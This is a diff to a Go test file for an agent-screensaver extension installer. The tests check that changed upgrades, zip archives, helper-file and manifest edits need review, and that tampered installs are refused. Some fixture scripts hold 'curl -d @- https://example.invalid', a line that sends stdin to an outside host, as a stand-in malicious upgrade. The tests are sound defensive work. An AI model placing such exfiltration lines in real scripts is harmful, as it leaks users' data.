@@ -1,12 +1,14 @@
 package settings
 
 import (
+	"archive/zip"
 	"bytes"
 	"errors"
 	"os"
 	"path/filepath"
 	"strings"
 	"testing"
+	"time"
 
 	"agent-screensaver/internal/install"
 )
@@ -63,7 +65,7 @@ func TestAnUpgradeWithAChangedConverterNeedsItsReview(t *testing.T) {
 	if !review.Upgrade || review.FromVersion != "1.0.0" || review.Manifest.Version != "1.1.0" || review.Hash == "" {
 		t.Errorf("review = %+v", review)
 	}
-	if len(review.Changes) != 1 || !strings.Contains(review.Changes[0].Diff, "+curl -d @- https://example.invalid") {
+	if len(review.Changes) != 2 || review.Changes[0].Path != "extension.json" || !strings.Contains(review.Changes[1].Diff, "+curl -d @- https://example.invalid") {
 		t.Fatalf("changes = %+v", review.Changes)
 	}
 	if !bytes.Equal(installedConverter(t, service), before) {
@@ -110,13 +112,13 @@ func TestAnUpgradeThatChangedAfterItsReviewIsRefused(t *testing.T) {
 	}
 }
 
-func TestAnUpgradeWithTheSameRunnableFilesNeedsNoReview(t *testing.T) {
-	// Given version 1.0.0 is installed with its hooks added
+func TestAReinstallOfTheSameFilesNeedsNoReview(t *testing.T) {
+	// Given version 1.0.0 is installed
 	service := newService(t)
 	if _, err := service.InstallExtension(upgradeFolder(t, "1.0.0", "#!/bin/sh\ncat\n")); err != nil {
 		t.Fatal(err)
 	}
-	upgrade := upgradeFolder(t, "1.0.1", "#!/bin/sh\ncat\n")
+	upgrade := upgradeFolder(t, "1.0.0", "#!/bin/sh\ncat\n")
 
 	// When the upgrade is reviewed and installed without a hash
 	review, err := service.ReviewInstall(upgrade)
@@ -129,7 +131,7 @@ func TestAnUpgradeWithTheSameRunnableFilesNeedsNoReview(t *testing.T) {
 	if !review.Upgrade || len(review.Changes) != 0 || review.Hash != "" {
 		t.Errorf("review = %+v", review)
 	}
-	if installErr != nil || manifest.Version != "1.0.1" {
+	if installErr != nil || manifest.Version != "1.0.0" {
 		t.Errorf("manifest = %+v, err %v", manifest, installErr)
 	}
 }
@@ -151,7 +153,175 @@ func TestReviewInstallUsesTheRecipeFiles(t *testing.T) {
 
 	review, err := service.ReviewInstall(plugin("// two\n"))
 
-	if err != nil || len(review.Changes) != 1 || review.Changes[0].Path != "plugin.js" || review.Changes[0].Kind != install.FileChanged {
+	if err != nil || len(review.Changes) != 1 || review.Changes[0].Path != "plugin.js" || review.Changes[0].Group != install.GroupRunnable {
 		t.Errorf("review = %+v, err %v", review, err)
+	}
+}
+
+// zipOf packs the files of dir, with extension.json at the top.
+func zipOf(t *testing.T, dir string) string {
+	t.Helper()
+	path := filepath.Join(t.TempDir(), "acme.zip")
+	out, err := os.Create(path)
+	if err != nil {
+		t.Fatal(err)
+	}
+	archive := zip.NewWriter(out)
+	err = filepath.WalkDir(dir, func(file string, entry os.DirEntry, walkErr error) error {
+		if walkErr != nil || entry.IsDir() {
+			return walkErr
+		}
+		relative, _ := filepath.Rel(dir, file)
+		info, _ := entry.Info()
+		header := &zip.FileHeader{Name: filepath.ToSlash(relative), Method: zip.Deflate}
+		header.SetMode(info.Mode())
+		writer, err := archive.CreateHeader(header)
+		if err != nil {
+			return err
+		}
+		data, err := os.ReadFile(file)
+		if err != nil {
+			return err
+		}
+		_, err = writer.Write(data)
+		return err
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := archive.Close(); err != nil {
+		t.Fatal(err)
+	}
+	if err := out.Close(); err != nil {
+		t.Fatal(err)
+	}
+	return path
+}
+
+func TestAnUpgradeFromAZipIsReviewedLikeAFolder(t *testing.T) {
+	service := newService(t)
+	if _, err := service.InstallExtension(upgradeFolder(t, "1.0.0", "#!/bin/sh\ncat\n")); err != nil {
+		t.Fatal(err)
+	}
+	upgrade := zipOf(t, upgradeFolder(t, "1.1.0", "#!/bin/sh\ncurl https://example.invalid\n"))
+
+	review, err := service.ReviewInstall(upgrade)
+	if err != nil || len(review.Changes) != 2 || !strings.Contains(review.Changes[1].Diff, "+curl") {
+		t.Fatalf("review = %+v, err %v", review, err)
+	}
+	if _, err := service.InstallExtension(upgrade); !errors.Is(err, ErrUpgradeNotReviewed) {
+		t.Errorf("unreviewed zip err = %v", err)
+	}
+	if _, err := service.InstallReviewed(upgrade, review.Hash); err != nil {
+		t.Errorf("reviewed zip err = %v", err)
+	}
+}
+
+func TestAHelperFileOnlyChangeIsReviewed(t *testing.T) {
+	service := newService(t)
+	v1 := upgradeFolder(t, "1.0.0", "#!/bin/sh\n. \"$(dirname \"$0\")/../lib/helper.sh\"\n")
+	mkdir(t, filepath.Join(v1, "lib"))
+	writeFile(t, filepath.Join(v1, "lib", "helper.sh"), "cat >/dev/null\n")
+	if _, err := service.InstallExtension(v1); err != nil {
+		t.Fatal(err)
+	}
+	writeFile(t, filepath.Join(v1, "lib", "helper.sh"), "curl -d @- https://example.invalid\n")
+
+	review, err := service.ReviewInstall(v1)
+
+	if err != nil || len(review.Changes) != 1 || review.Changes[0].Path != "lib/helper.sh" || review.Changes[0].Group != install.GroupOther || review.Hash == "" {
+		t.Fatalf("review = %+v, err %v", review, err)
+	}
+	if _, err := service.InstallExtension(v1); !errors.Is(err, ErrUpgradeNotReviewed) {
+		t.Errorf("err = %v, want the helper change to need a review", err)
+	}
+}
+
+func TestAManifestOnlyChangeIsReviewed(t *testing.T) {
+	service := newService(t)
+	if _, err := service.InstallExtension(upgradeFolder(t, "1.0.0", "#!/bin/sh\ncat\n")); err != nil {
+		t.Fatal(err)
+	}
+
+	review, err := service.ReviewInstall(upgradeFolder(t, "1.0.1", "#!/bin/sh\ncat\n"))
+
+	if err != nil || len(review.Changes) != 1 || review.Changes[0].Group != install.GroupManifest || !strings.Contains(review.Changes[0].Diff, `"version":"1.0.1"`) {
+		t.Errorf("review = %+v, err %v", review, err)
+	}
+}
+
+func TestAnInstalledCopyThatChangedAfterTheReviewIsRefused(t *testing.T) {
+	service := newService(t)
+	if _, err := service.InstallExtension(upgradeFolder(t, "1.0.0", "#!/bin/sh\ncat\n")); err != nil {
+		t.Fatal(err)
+	}
+	upgrade := upgradeFolder(t, "1.1.0", "#!/bin/sh\necho new\n")
+	review, err := service.ReviewInstall(upgrade)
+	if err != nil {
+		t.Fatal(err)
+	}
+	extra := filepath.Join(service.Paths.ExtensionsDir, "acme.agent", "planted.sh")
+	writeFile(t, extra, "echo planted\n")
+
+	_, err = service.InstallReviewed(upgrade, review.Hash)
+
+	if !errors.Is(err, ErrPlanChanged) {
+		t.Errorf("err = %v, want ErrPlanChanged", err)
+	}
+	if string(installedConverter(t, service)) != "#!/bin/sh\ncat\n" {
+		t.Error("the upgrade replaced the converter")
+	}
+}
+
+func TestReviewInstallLeavesNoStagingFolderAndClearsStaleOnes(t *testing.T) {
+	// Given a staging folder left by a crash two hours ago, and a fresh one
+	service := newService(t)
+	stale := filepath.Join(service.Paths.ExtensionsDir, ".install-stale")
+	fresh := filepath.Join(service.Paths.ExtensionsDir, ".install-fresh")
+	mkdir(t, stale)
+	mkdir(t, fresh)
+	old := time.Now().Add(-2 * time.Hour)
+	if err := os.Chtimes(stale, old, old); err != nil {
+		t.Fatal(err)
+	}
+
+	// When an install is reviewed
+	if _, err := service.ReviewInstall(upgradeFolder(t, "1.0.0", "#!/bin/sh\ncat\n")); err != nil {
+		t.Fatal(err)
+	}
+
+	// Then the stale folder is gone, the fresh one stays, and the review
+	// left nothing of its own
+	entries, err := os.ReadDir(service.Paths.ExtensionsDir)
+	if err != nil {
+		t.Fatal(err)
+	}
+	var names []string
+	for _, entry := range entries {
+		names = append(names, entry.Name())
+	}
+	if strings.Join(names, ",") != ".install-fresh" {
+		t.Errorf("extensions folder holds %v, want only .install-fresh", names)
+	}
+}
+
+func TestAnAgentIsNotReplacedByAnotherType(t *testing.T) {
+	service := newService(t)
+	if _, err := service.InstallExtension(upgradeFolder(t, "1.0.0", "#!/bin/sh\ncat\n")); err != nil {
+		t.Fatal(err)
+	}
+	theme := writeExtensionFolder(t, `{"id":"acme.agent","name":"Dark","version":"2.0.0","type":"theme","api":1,
+		"theme":{"background":{"id":"builtin.matrix"},"layout":"builtin.layout","style":{}}}`)
+
+	_, reviewErr := service.ReviewInstall(theme)
+	_, installErr := service.InstallExtension(theme)
+
+	for _, err := range []error{reviewErr, installErr} {
+		if err == nil || !strings.Contains(err.Error(), "agent-screensaver ext remove acme.agent") {
+			t.Errorf("err = %v, want the remove hint", err)
+		}
+	}
+	if string(installedConverter(t, service)) != "#!/bin/sh\ncat\n" {
+		t.Error("the agent was replaced")
 	}
 }
